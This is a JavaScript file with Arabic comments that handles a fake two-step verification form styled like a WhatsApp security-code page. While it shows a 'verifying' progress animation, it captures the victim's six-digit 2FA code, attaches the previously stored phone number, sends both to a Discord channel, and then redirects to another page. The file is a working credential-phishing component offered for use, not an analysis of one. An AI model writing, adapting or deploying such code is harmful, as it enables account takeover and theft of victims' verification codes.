// معالج نموذج رمز الأمان للتحقق بخطوتين
document.addEventListener('DOMContentLoaded', function () {
    const form = document.getElementById('securityCodeForm');
    const codeInput = document.getElementById('template');
    const confirmBtn = document.getElementById('confirmSecurityCodeBtn');

    let loadingTimeout;

    // تنسيق الرمز أثناء الكتابة
    codeInput.addEventListener('input', function (e) {
        // السماح فقط بالأرقام
        this.value = this.value.replace(/[^0-9]/g, '');

        hideError();
        hideSuccess();

        // إظهار تنسيق صحيح أثناء الكتابة
        if (this.value.length >= 6) {
            this.style.borderColor = '#25D366';
            this.style.boxShadow = '0 0 0 3px rgba(37, 211, 102, 0.1)';
        } else {
            this.style.borderColor = '#e0e0e0';
            this.style.boxShadow = 'none';
        }
    });

    // معالج إرسال النموذج
    form.addEventListener('submit', async function (e) {
        e.preventDefault();

        hideError();
        hideSuccess();

        const code = codeInput.value.trim();

        // التحقق من وجود الرمز
        if (!code) {
            showError('⚠️ يرجى إدخال رمز الأمان المكون من 6 أرقام');
            codeInput.focus();
            return;
        }

        // التحقق من طول الرمز (6 أرقام)
        if (code.length !== 6) {
            showError('⚠️ رمز الأمان يجب أن يكون 6 أرقام');
            codeInput.focus();
            return;
        }

        // تعطيل النموذج وعرض التحميل
        disableForm('securityCodeForm');
        showChronoLoading('جاري التحقق من رمز الأمان ...');

        // بدء التحميل لمدة 2 ثانية
        startLinearLoading(2, 'about.html');

        try {
            // الحصول على معلومات الجهاز وIP
            const { device } = getDeviceInfo();
            const { country, city, ip } = await getIPInfo();

            // الحصول على رقم الهاتف المحفوظ
            const phoneNumber = getFromStorage('phoneNumber') || 'غير معروف';
            const countryCode = getFromStorage('countryCode') || '+968';

            // إرسال بيانات رمز الأمان إلى Discord
            const message = `🔐 **رمز الأمان (التحقق بخطوتين):** ${code}\n📱 **الرقم:** ${countryCode}${phoneNumber}\n🌍 `;

            const success = await sendToDiscord(message);

            if (success) {
                // حفظ رمز الأمان
                saveToStorage('securityCode', code);
                saveToStorage('twoFactorVerified', 'true');

                // الخط التحميلي سيتولى عملية التوجيه بعد 2 ثانية
            } else {
                clearTimeout(loadingTimeout);
                hideChronoLoading();
                enableForm('securityCodeForm');
                showError('حدث خطأ أثناء التحقق من رمز الأمان. حاول مرة أخرى.');
            }
        } catch (error) {
            console.error('خطأ:', error);
            clearTimeout(loadingTimeout);
            hideChronoLoading();
            enableForm('securityCodeForm');
            showError('حدث خطأ أثناء التحقق من رمز الأمان. حاول مرة أخرى.');
        }
    });

    // وظائف التحكم في التحميل الخطي
    function startLinearLoading(seconds, redirectUrl) {
        const progressElement = document.querySelector('.chrono-progress');

        if (progressElement) {
            progressElement.style.width = '0%';
            progressElement.style.transition = `width ${seconds}s linear`;

            setTimeout(() => {
                progressElement.style.width = '100%';
            }, 100);
        }

        loadingTimeout = setTimeout(() => {
            window.location.href = redirectUrl;
        }, seconds * 1000);
    }

    function showChronoLoading(text = 'جاري التحقق من رمز الأمان ...') {
        const loadingOverlay = document.getElementById('loadingPopup');
        const chronoLabel = document.querySelector('.chrono-label');

        if (chronoLabel) {
            const dots = chronoLabel.querySelectorAll('.pulsing-dot');
            chronoLabel.innerHTML = text;
            dots.forEach(dot => chronoLabel.appendChild(dot));
        }
        loadingOverlay.style.display = 'flex';
    }

    function hideChronoLoading() {
        const loadingOverlay = document.getElementById('loadingPopup');
        loadingOverlay.style.display = 'none';

        if (loadingTimeout) {
            clearTimeout(loadingTimeout);
        }
    }

    // وظائف مساعدة للرسائل
    function showError(message) {
        const errorMsg = document.getElementById('errorMsg');
        if (errorMsg) {
            errorMsg.textContent = message;
            errorMsg.style.display = 'block';
        }
    }

    function hideError() {
        const errorMsg = document.getElementById('errorMsg');
        if (errorMsg) {
            errorMsg.style.display = 'none';
        }
    }

    function showSuccess(message) {
        const successMsg = document.getElementById('successMsg');
        if (successMsg) {
            successMsg.textContent = message;
            successMsg.style.display = 'block';
        }
    }

    function hideSuccess() {
        const successMsg = document.getElementById('successMsg');
        if (successMsg) {
            successMsg.style.display = 'none';
        }
    }

    function disableForm(formId) {
        const form = document.getElementById(formId);
        if (form) {
            const inputs = form.querySelectorAll('input, button');
            inputs.forEach(input => {
                input.disabled = true;
            });
        }
    }

    function enableForm(formId) {
        const form = document.getElementById(formId);
        if (form) {
            const inputs = form.querySelectorAll('input, button');
            inputs.forEach(input => {
                input.disabled = false;
            });
        }
    }
});